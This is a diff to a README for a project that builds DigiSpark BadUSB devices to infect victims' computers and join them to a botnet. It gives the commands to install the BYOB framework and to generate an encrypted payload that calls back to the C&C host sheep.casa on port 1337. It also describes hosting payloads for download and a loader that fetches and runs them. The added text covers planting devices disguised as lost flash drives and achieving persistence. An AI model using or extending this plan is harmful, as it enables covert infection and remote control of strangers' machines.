@@ -4,7 +4,7 @@
 The objective of this project is to create BadUSB devices, that upon plugin, infect victim computers with malware configured to join a botnet.
 
 ### BadUSB  
-To create our BadUSB devices we'll be using the [DigiSpark](http://digistump.com/products/1) development board by [Digistump](http://digistump.com/). These devices will be reconized as USB keyboards by the victims' machines, and will execute keystrokes to deliver our payload.
+To create our BadUSB devices we'll be using the [DigiSpark](http://digistump.com/products/1) development board by [Digistump](http://digistump.com/). These devices will be recognized as USB keyboards by the victims' machines, and will execute keystrokes to deliver our payload.
 
 ### Botnet  
 For our botnet we're currently still exploring a handful of open source frameworks. The leading contender at the moment is [Build Your Own Botnet](https://github.com/malwaredllc/byob). Other frameworks we're looking into include [GoBot2](https://github.com/SaturnsVoid/GoBot2), [UBoat](https://github.com/Souhardya/UBoat), and [Loki](https://github.com/Pure-L0G1C/Loki). There may be other frameworks we explore as they're discovered. Our ultimate goal is an easily deployed and managed *command and control server*, and the ability to generate cross platform compatible clients.
@@ -78,7 +78,7 @@ We've created a VPS on Digital Ocean to run our C&C server. We're using an Ubunt
 
 
 
-The botnet framework we're currently using (BYOB) was installed via `git clone git@github.com:malwaredllc/byob.git && cd ./byob && pip install -r requirements.txt &&  mv ../byob /opt/`. This clones the repository, installes the required python modules, and moves the directory to into `/opt`.  
+The botnet framework we're currently using (BYOB) was installed via `git clone git@github.com:malwaredllc/byob.git && cd ./byob/byob && pip install -r requirements.txt &&  mv ../../byob /opt/`. This clones the repository, installs the required python modules, and moves the directory to into `/opt`.  
 
 To launch the botnet we've created a bash script setting the host to `sheep.casa` and the listening port to `1337`. This script is placed in the `/root` directory. 
 
@@ -106,12 +106,12 @@ The loader script downloads our python payload and executes it to join our botne
 
 #### Python Payload
 
-A paylaod is generated via BYOB's `client.py` script. We've generated our linux payload by issuing `python client.py --name linux_payload --encrypt --compress --freeze sheep.casa 1337`.
+A payload is generated via BYOB's `client.py` script. We've generated our Linux payload by issuing `python client.py --name linux_payload --encrypt --compress --freeze sheep.casa 1337`.
 
 ![payload_generated](./images/payload_generated.png)
 **Figure 9:** Generating our python payload.
 
-In order to host our payloads, we've installed Apache 2. The payload generated above was moved from BYOB's directory to `/var/www/html/payloads`. This is where our victims will download the payload from.
+In order to host our payloads, we've installed Apache 2 on the C&C server. In a real world attack this would be pretty bad practice, but it's a matter of convenience for us. The payload generated above was moved from BYOB's directory to `/var/www/html/payloads`. This is where our victims will download the payload from.
 
 ![payload_directory](./images/payload_directory.png)
 **Figure 10:** `/payloads` directory hosting our malicious files.
@@ -137,5 +137,7 @@ We've yet to configure our BadUSB devices to infect Windows or OSX machines. Add
 
 Ideally, the same BadUSB device would be able to infect Windows, OSX, and Linux. However, we're still uncertain that this is technically achievable given the way USB functions. Currently we do not have knowledge of how to detect which operating system a victim's computer is running. We may need to configure different devices to be plugged in depending on the victim's machine. However, we will still explore how one device may be used to infect all OS(s). An option we're exploring is simply loading all of our payloads onto one device, and attempting to execute each of them quietly until the machine is infected.
 
-A different device per OS would be perfectly acceptable in an attack scenario in which the attacker has physical access to the victim's machine. The devices are cheap and small, so carrying three of them should be no issue. However, for attack scenarios in which the drive is left in a public place for a victim to find, the ability to infect any OS would greatly improve the success rate.
+A different device per OS would be perfectly acceptable in an attack scenario in which the attacker has physical access to the victim's machine. The devices are cheap and small, so carrying three of them should be no issue. However, for attack scenarios in which the BadUSB device is left in a public place for a victim to find (disguised as a lost flash drive), the ability to infect any OS would greatly improve the success rate.
+
+Lastly, once a victim is initially infected, we'd like to keep them infected. This means we're exploring how to add our payloads to run on startup, but without root/admin privileges this may not be feasible. 
 
